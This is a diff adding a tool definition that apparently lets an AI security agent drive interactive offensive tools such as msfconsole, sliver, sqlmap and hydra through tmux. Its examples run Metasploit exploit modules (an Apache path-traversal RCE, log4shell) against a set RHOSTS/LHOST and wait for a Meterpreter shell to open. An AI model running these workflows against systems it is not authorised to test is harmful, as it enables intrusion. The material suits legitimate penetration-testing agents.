@@ -1,0 +1,117 @@
+<tools>
+  <tool name="tmux_interactive">
+    <description>Persistent tmux session for interactive security tools that take over the shell.
+
+Unlike the regular `terminal_execute` tool which wraps commands with a PS1 marker for completion detection, this tool creates a long-lived tmux pane that runs an interactive tool (msfconsole, sliver-client, sqlmap --wizard, evil-winrm, hydra --pause, wpscan, mysql, psql, ipython, pdb, ftp, telnet, etc.) and lets you drive it step-by-step like a human operator.
+
+Each session has a configurable prompt regex — either passed explicitly via `prompt_regex` or auto-detected from the launch command (built-in profiles for msfconsole, sliver, sqlmap, hydra, evil-winrm, python, ipython, pdb, mysql, psql, redis, mongo, ftp, telnet, smbclient, wpscan, rlwrap). After each `send`, the session blocks until the prompt reappears, so you can reliably chain commands.
+
+Use this tool when terminal_execute would hang because the target process does not produce a bash PS1.</description>
+    <details>Session names are per-agent and must be unique within an agent. Up to 8 concurrent interactive sessions per agent.
+
+Typical workflow for msfconsole:
+1. tmux_interactive(action="start", name="msf", command="msfconsole -q")
+2. tmux_interactive(action="send", name="msf", text="use exploit/multi/http/apache_normalize_path_rce_cve_2021_41773")
+3. tmux_interactive(action="send", name="msf", text="set RHOSTS 10.0.0.5")
+4. tmux_interactive(action="send", name="msf", text="set LHOST 10.0.0.1")
+5. tmux_interactive(action="send", name="msf", text="run", wait_for_prompt_after_send=false)
+6. tmux_interactive(action="wait", name="msf", pattern="Meterpreter session \\d+ opened", timeout=120)
+7. tmux_interactive(action="read", name="msf", lines=50)
+8. tmux_interactive(action="kill", name="msf")
+
+Typical workflow for sqlmap interactive:
+1. tmux_interactive(action="start", name="sqlmap_wiz", command="sqlmap --wizard")
+2. tmux_interactive(action="send", name="sqlmap_wiz", text="https://target.com/?id=1")
+3. tmux_interactive(action="send", name="sqlmap_wiz", text="1")
+4. tmux_interactive(action="send", name="sqlmap_wiz", text="1")
+... etc.
+
+For Python REPL debugging:
+1. tmux_interactive(action="start", name="py", command="python3")
+2. tmux_interactive(action="send", name="py", text="import requests")
+3. tmux_interactive(action="send", name="py", text="r = requests.get('https://target/api')")
+4. tmux_interactive(action="send", name="py", text="print(r.status_code, len(r.text))")
+5. tmux_interactive(action="kill", name="py")
+
+Sending raw keys (no newline): action="key", key="C-c" to interrupt, "Up"/"Down" for history, "Tab" for completion.</details>
+    <parameters>
+      <parameter name="action" type="string" required="true">
+        <description>One of: start, send, key, read, wait, kill, list</description>
+      </parameter>
+      <parameter name="name" type="string" required="false">
+        <description>Session name (required for start, send, key, read, wait, kill). Per-agent unique identifier.</description>
+      </parameter>
+      <parameter name="command" type="string" required="false">
+        <description>Command to launch in the new pane (required for start). Examples: `msfconsole -q`, `sliver`, `sqlmap --wizard`, `python3`, `mysql -h host -u user -p`.</description>
+      </parameter>
+      <parameter name="text" type="string" required="false">
+        <description>Line of text to send as input (used with action=send). Enter is appended automatically.</description>
+      </parameter>
+      <parameter name="key" type="string" required="false">
+        <description>Raw key to send without Enter (used with action=key). Tmux key names: C-c, C-d, C-z, Enter, Escape, Tab, BSpace, Up, Down, Left, Right, Home, End, PageUp, PageDown, F1-F12.</description>
+      </parameter>
+      <parameter name="pattern" type="string" required="false">
+        <description>Regex to wait for in the buffer (used with action=wait). If omitted, waits for the session's prompt regex to reappear.</description>
+      </parameter>
+      <parameter name="prompt_regex" type="string" required="false">
+        <description>Custom prompt regex to override auto-detection (used with action=start). Applied as multiline. If omitted and the command matches a known tool (msfconsole, sliver, sqlmap, etc.), the appropriate built-in regex is used.</description>
+      </parameter>
+      <parameter name="work_dir" type="string" required="false">
+        <description>Starting working directory for the pane. Default: /workspace.</description>
+      </parameter>
+      <parameter name="wait_for_prompt_after_send" type="boolean" required="false">
+        <description>If true (default), action=send blocks until the prompt reappears. Set to false for commands that do not return to prompt immediately (e.g., `run` in msfconsole), then use action=wait with a pattern.</description>
+      </parameter>
+      <parameter name="lines" type="integer" required="false">
+        <description>Tail last N lines from the buffer (used with action=read). 0 = full buffer.</description>
+      </parameter>
+      <parameter name="timeout" type="number" required="false">
+        <description>Max seconds to wait for prompt or pattern. Default 30.</description>
+      </parameter>
+    </parameters>
+    <returns type="Dict[str, Any]">
+      <description>Success flag, current buffer, at_prompt indicator, matched flag (for wait), and session info (alive, uptime_sec, prompt_regex).</description>
+    </returns>
+    <examples>
+  <function=tmux_interactive>
+  <parameter=action>start</parameter>
+  <parameter=name>msf</parameter>
+  <parameter=command>msfconsole -q</parameter>
+  </function>
+
+  <function=tmux_interactive>
+  <parameter=action>send</parameter>
+  <parameter=name>msf</parameter>
+  <parameter=text>use exploit/multi/http/log4shell_header_injection</parameter>
+  </function>
+
+  <function=tmux_interactive>
+  <parameter=action>wait</parameter>
+  <parameter=name>msf</parameter>
+  <parameter=pattern>Meterpreter session \d+ opened</parameter>
+  <parameter=timeout>120</parameter>
+  </function>
+
+  <function=tmux_interactive>
+  <parameter=action>key</parameter>
+  <parameter=name>msf</parameter>
+  <parameter=key>C-c</parameter>
+  </function>
+
+  <function=tmux_interactive>
+  <parameter=action>read</parameter>
+  <parameter=name>msf</parameter>
+  <parameter=lines>40</parameter>
+  </function>
+
+  <function=tmux_interactive>
+  <parameter=action>list</parameter>
+  </function>
+
+  <function=tmux_interactive>
+  <parameter=action>kill</parameter>
+  <parameter=name>msf</parameter>
+  </function>
+    </examples>
+  </tool>
+</tools>
